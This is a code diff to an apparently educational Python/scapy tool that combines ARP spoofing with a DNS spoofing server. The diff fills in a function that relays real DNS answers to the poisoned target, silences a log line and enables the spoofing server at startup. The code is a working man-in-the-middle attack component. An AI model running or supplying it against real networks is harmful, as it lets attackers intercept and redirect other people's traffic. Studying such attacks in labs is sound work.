@@ -71,7 +71,7 @@ class ArpSpoofer(object):
         )
         # Send the packet
         send(arp_response, verbose=0)
-        print(f"Sent ARP packet: {self.target_ip} is-at {self.spoof_ip}")
+        #print(f"Sent ARP packet: {self.target_ip} is-at {self.spoof_ip}")
 
     def spoof(self) -> None:
         """
@@ -123,6 +123,10 @@ class DnsHandler(object):
 
         self.spoof_dict = spoof_dict
         self.real_dns_server_ip = REAL_DNS_SERVER_IP
+    
+
+
+
 
     def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
         """
@@ -133,7 +137,12 @@ class DnsHandler(object):
         @param pkt DNS request from target.
         @return DNS response to pkt, source IP changed.
         """
-        pass
+        src, src_port, dst, dst_port, qname = pkt[IP].src, pkt[UDP].sport, pkt[IP].dst, pkt[UDP].dport, pkt[DNSQR].qname
+        dns_request = IP(dst=self.real_dns_server_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
+        dns_response = sr1(dns_request, timeout=2)
+        if dns_response:
+            response_pkt = IP(src=dst, dst=src)/UDP(sport=dst_port, dport = src_port)/dns_response[DNS]
+            send(response_pkt)
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
         """
@@ -186,5 +195,5 @@ if __name__ == "__main__":
     server = DnsHandler(plist, SPOOF_DICT)
 
     print("Starting sub-processes...")
-    #server.start()
+    server.start()
     spoofer.start()
